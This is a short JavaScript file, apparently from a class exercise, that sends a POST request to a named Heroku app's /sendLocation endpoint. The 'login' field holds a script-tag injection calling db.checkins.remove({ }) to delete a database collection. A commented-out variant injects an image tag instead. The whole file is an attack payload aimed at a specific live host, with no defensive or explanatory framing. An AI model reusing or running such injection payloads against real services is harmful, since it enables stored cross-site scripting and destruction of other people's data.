myLat = 42.408206799999995;
myLng = -71.1162451;
function post_DataStore() {
    var request = new XMLHttpRequest();
    var url = "http://warm-coast-85656.herokuapp.com/sendLocation";

    var params = "login=<script>db.checkins.remove({ })</script>&lat="
                    + myLat + "&lng=" + myLng;

 //   var params = "login=<img src='https://i.imgflip.com/o2b10.jpg'>&lat="
   //                  + myLat + "&lng=" + myLng;
    request.open("POST", url, true);
    request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    request.send(params);
} 
 